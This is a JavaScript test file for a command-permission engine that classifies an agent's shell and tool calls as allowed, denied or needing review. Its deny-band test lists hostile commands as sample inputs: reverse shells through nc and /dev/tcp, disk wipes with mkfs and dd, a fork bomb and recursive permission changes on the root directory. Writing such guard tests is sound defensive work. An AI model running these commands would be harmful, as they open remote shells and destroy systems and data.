import test from "node:test";
import assert from "node:assert/strict";
import { BandsEngine, compileGlob } from "../lib/bands.js";

test("compileGlob correctly compiles patterns", () => {
  const g1 = compileGlob("git status*");
  assert.equal(g1.test("git status"), true);
  assert.equal(g1.test("git status --short"), true);
  assert.equal(g1.test("git log"), false);

  const g2 = compileGlob("npm test*");
  assert.equal(g2.test("npm test"), true);
  assert.equal(g2.test("npm test -- --watch"), true);
  assert.equal(g2.test("npm install"), false);
});

test("BandsEngine allows read-only tools immediately", () => {
  const bands = new BandsEngine();
  assert.equal(bands.evaluate("read_file"), "allow");
  assert.equal(bands.evaluate("glob"), "allow");
  assert.equal(bands.evaluate("grep"), "allow");
  assert.equal(bands.evaluate("view_file"), "allow");
});

test("BandsEngine triggers Band 0 Hard Deny on dangerous commands", () => {
  const bands = new BandsEngine();

  // Reverse shell / exfiltration
  assert.equal(bands.evaluate("bash", "nc -e /bin/sh 10.0.0.1 4444"), "deny");
  assert.equal(bands.evaluate("bash", "bash -i >& /dev/tcp/1.2.3.4/8080 0>&1"), "deny");

  // Raw disk destruction
  assert.equal(bands.evaluate("bash", "mkfs.ext4 /dev/sdb1"), "deny");
  assert.equal(bands.evaluate("bash", "dd if=/dev/zero of=/dev/sda bs=1M"), "deny");

  // System destruction
  assert.equal(bands.evaluate("bash", ":(){ :|:& };:"), "deny");
  assert.equal(bands.evaluate("bash", "chmod -R 777 /"), "deny");
  assert.equal(bands.evaluate("bash", "chown -R root /"), "deny");
  assert.equal(bands.evaluate("bash", "shutdown -h now"), "deny");
  assert.equal(bands.evaluate("bash", "reboot"), "deny");
});

test("BandsEngine triggers Band 1 Safe Allow on routine inspection commands", () => {
  const bands = new BandsEngine();

  assert.equal(bands.evaluate("bash", "git status"), "allow");
  assert.equal(bands.evaluate("bash", "git diff HEAD~1"), "allow");
  assert.equal(bands.evaluate("bash", "git log -n 5 --oneline"), "allow");
  assert.equal(bands.evaluate("bash", "ls -la src/"), "allow");
  assert.equal(bands.evaluate("bash", "pwd"), "allow");
  assert.equal(bands.evaluate("bash", "cat README.md"), "allow");
  assert.equal(bands.evaluate("bash", "head -n 20 file.txt"), "allow");
  assert.equal(bands.evaluate("bash", "npm test"), "allow");
  assert.equal(bands.evaluate("bash", "pnpm test"), "allow");
  assert.equal(bands.evaluate("bash", "cargo check"), "allow");
  assert.equal(bands.evaluate("bash", "pytest tests/"), "allow");
  assert.equal(bands.evaluate("bash", "node --version"), "allow");
  assert.equal(bands.evaluate("bash", "echo 'hello world'"), "allow");
});

test("BandsEngine yields unmatched for ambiguous commands requiring deeper inspection", () => {
  const bands = new BandsEngine();

  assert.equal(bands.evaluate("bash", "npm publish"), "unmatched");
  assert.equal(bands.evaluate("bash", "git push origin main"), "unmatched");
  assert.equal(bands.evaluate("bash", "curl -X POST https://api.github.com"), "unmatched");
  assert.equal(bands.evaluate("bash", "docker run -it alpine"), "unmatched");
  assert.equal(bands.evaluate("bash", "rm old-output.log"), "unmatched");
});
